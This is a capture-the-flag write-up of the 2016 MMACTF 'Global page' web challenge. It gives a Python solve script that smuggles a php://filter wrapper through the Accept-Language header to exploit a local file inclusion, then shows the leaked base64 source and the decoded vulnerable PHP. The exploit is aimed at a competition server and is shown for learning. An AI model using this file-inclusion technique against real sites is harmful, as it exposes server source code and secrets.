================================================================================================================
[2016_MMACTF] [WEB] Global page
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="header {Accept-Language: en-US,en;q=0.5,/filter/read=convert.base64-encode/resource=index}",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|


solve
================================================================================================================


.. code-block:: python

    import requests


    url = "http://globalpage.chal.ctf.westerns.tokyo/?page=php:"

    headers = {
        "Accept-Language": "en-US,en;q=0.5,/filter/read=convert.base64-encode/resource=index"
    }

    r = requests.get(url, headers=headers, verify=False)
    print r.content



**return page**

PD9waHAgaWYgKCFkZWZpbmVkKCdJTkNMVURFRF9JTkRFWCcpKSB7IGRlZmluZSgnSU5DTFVERURfSU5ERVgnLCB0cnVlKTsgaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsgaW5jbHVkZSAiZmxhZy5waHAiOyA/PiA8IWRvY3R5cGUgaHRtbD4gPGh0bWw+IDxoZWFkPiA8bWV0YSBjaGFyc2V0PXV0Zi04PiA8dGl0bGU+R2xvYmFsIFBhZ2U8L3RpdGxlPiA8c3R5bGU+IC5ydGwgeyBkaXJlY3Rpb246IHJ0bDsgfSA8L3N0eWxlPiA8L2hlYWQ+IDxib2R5PiA8P3BocCAkZGlyID0gIiI7IGlmKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7ICRkaXIgPSBzdHJfcmVwbGFjZShbJy4nLCAnLyddLCAnJywgJF9HRVRbJ3BhZ2UnXSk7IH0gaWYoZW1wdHkoJGRpcikpIHsgPz4gPHVsPiA8bGk+PGEgaHJlZj0iLz9wYWdlPXRva3lvIj5Ub2t5bzwvYT48L2xpPiA8bGk+PGRlbD5XZXN0ZXJuczwvZGVsPjwvbGk+IDxsaT48YSBocmVmPSIvP3BhZ2U9Y3RmIj5DVEY8L2E+PC9saT4gPC91bD4gPD9waHAgfSBlbHNlIHsgZm9yZWFjaChleHBsb2RlKCIsIiwgJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pIGFzICRsYW5nKSB7ICRsID0gdHJpbShleHBsb2RlKCI7IiwgJGxhbmcpWzBdKTsgPz4gPHA8Pz0oJGw9PT0naGUnKT8iIGNsYXNzPXJ0bCI6IiI/Pj4gPD9waHAgaW5jbHVkZSAiJGRpci8kbC5waHAiOyA/PiA8L3A+IDw/cGhwIH0gfSA/PiA8L2JvZHk+IDwvaHRtbD4gPD9waHAgfSA/Pg==

base64 decode

.. code-block:: php

    <?php
    if (!defined(‘INCLUDED_INDEX’)) {
    define(‘INCLUDED_INDEX’, true);
    ini_set(‘display_errors’, 1);
    include “flag.php“;
    ?>
    <!doctype html>
    <html>
    <head>
    <meta charset=utf-8>
    <title>Global Page</title>
    <style>
    .rtl {
    direction: rtl;
    }
    </style>
    </head>

    <body>
    <?php
    $dir = “”;
    if(isset($_GET[‘page’])) {
    $dir = str_replace([‘.’, ‘/’], ”, $_GET[‘page’]);
    }

    if(empty($dir)) {
    ?>
    <ul>
    <li><a href=”/?page=tokyo”>Tokyo</a></li>
    <li><del>Westerns</del></li>
    <li><a href=”/?page=ctf”>CTF</a></li>
    </ul>
    <?php
    }
    else {
    foreach(explode(“,”, $_SERVER[‘HTTP_ACCEPT_LANGUAGE’]) as $lang) {
    $l = trim(explode(“;”, $lang)[0]);
    ?>
    <p<?=($l===’he’)?” class=rtl”:””?>>
    <?php
    include “$dir/$l.php”;
    ?>
    </p>
    <?php
    }
    }
    ?>
    </body>
    </html>
    <?php
    }
    ?>


